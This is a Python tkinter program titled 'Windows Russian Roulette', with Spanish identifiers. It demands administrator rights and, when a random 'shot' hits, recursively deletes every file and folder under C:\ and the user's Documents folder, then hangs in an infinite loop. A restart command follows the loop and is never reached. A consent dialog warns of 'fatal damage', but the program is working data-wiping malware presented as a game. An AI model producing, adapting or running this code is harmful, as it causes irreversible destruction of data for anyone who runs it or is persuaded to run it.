import tkinter as tk
from tkinter import messagebox
import subprocess
import sys
import time
import random
import os
import shutil
import ctypes
from PIL import Image, ImageTk
import pygame

pygame.mixer.init()

# Detectar si el programa está corriendo como .exe empaquetado
if getattr(sys, 'frozen', False):
    BASE_DIR = sys._MEIPASS
else:
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# Verificar permisos de administrador
def es_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

if not es_admin():
    messagebox.showerror("Permisos insuficientes", "Por favor, ejecuta la aplicación como administrador para que funcione.")
    sys.exit()

def borrar_carpeta(ruta):
    try:
        if os.path.exists(ruta):
            shutil.rmtree(ruta)
            print(f"La carpeta '{ruta}' ha sido eliminada correctamente.")
        else:
            print(f"La carpeta '{ruta}' no se encontró.")
    except Exception as e:
        print(f"Error al borrar la carpeta: {e}")

# Rutas de los recursos
musica_ruta = os.path.join(BASE_DIR, "music.mp3")
disparo_ruta = os.path.join(BASE_DIR, "gunshot.mp3")
icono_ruta = os.path.join(BASE_DIR, "Icon.ico")
imagen_ruta = os.path.join(BASE_DIR, "revolver.png")

pygame.mixer.music.load(musica_ruta)
gunshot = pygame.mixer.Sound(disparo_ruta)
def borrar_todo():
    try:
        ruta = "C:\\"
        for root, dirs, files in os.walk(ruta, topdown=False):
            for name in files:
                archivo_path = os.path.join(root, name)
                os.remove(archivo_path)
            for name in dirs:
                carpeta_path = os.path.join(root, name)
                os.rmdir(carpeta_path)
        messagebox.showinfo("Éxito", "Todos los archivos y carpetas han sido eliminados.")
    except Exception as e:
        messagebox.showerror("Error", f"Error al borrar: {e}")
        
        
def ventana_emergente():
    while True:
        messagebox.showerror("ERROR" "ERROR")
        
def bucle_infinito():
    while True:
        pass
    
numerobalas = 1
pygame.mixer.music.play(loops=-1)

def Disparar():
    numerobalasstring = spinbox.get()
    numerobalas = int(numerobalasstring)
    numero = random.randint(1, 6)
    if numero <= numerobalas:
        gunshot.play()
        pygame.mixer.music.stop()
        time.sleep(0.5)
        borrar_todo()
        borrar_carpeta(os.path.expanduser('~/Documents'))
        time.sleep(5)
        bucle_infinito()
        ventana_emergente
        time.sleep(1)
        os.system("shutdown /r /t 5")
    else:
        messagebox.showinfo("MISSED SHOT", "Your system is still in good condition. Continue at your own risk.")

ventana = tk.Tk()
ventana.resizable(False, False)
nombre_ventana = tk.Label(ventana, text="Number of bullets:", bg="red")
nombre_ventana.pack()
boton_disparar = tk.Button(ventana, text="Shoot", command=Disparar)
boton_disparar.pack(side="bottom")
spinbox = tk.Spinbox(ventana, text="Bullets 1/6", from_=1, to=6)
spinbox.pack(pady=10)
ventana.iconbitmap(icono_ruta)

imagen = Image.open(imagen_ruta)
imagen = imagen.resize((300, 180))
imagen_tk = ImageTk.PhotoImage(imagen)

label_imagen = tk.Label(ventana, image=imagen_tk)
label_imagen.pack()

ventana.title("Windows Russian Roulette")
ancho_ventana = 400
alto_ventana = 250
pantalla_ancho = ventana.winfo_screenwidth()
pantalla_alto = ventana.winfo_screenheight()
pos_x = (pantalla_ancho // 2) - (ancho_ventana // 2)
pos_y = (pantalla_alto // 2) - (alto_ventana // 2)
ventana.geometry(f"{ancho_ventana}x{alto_ventana}+{pos_x}+{pos_y}")

def MostrarVentana():
    ventana.mainloop()

def MostrarError():
    respuesta = messagebox.askyesno(
        "WARNING",
        "This app may cause fatal damage to your computer. Press no to exit safely. Use it at your own risk."
    )
    if respuesta:
        ventana.deiconify()
        MostrarVentana()
    else:
        ventana.destroy()
        sys.exit()

ventana.withdraw()
MostrarError()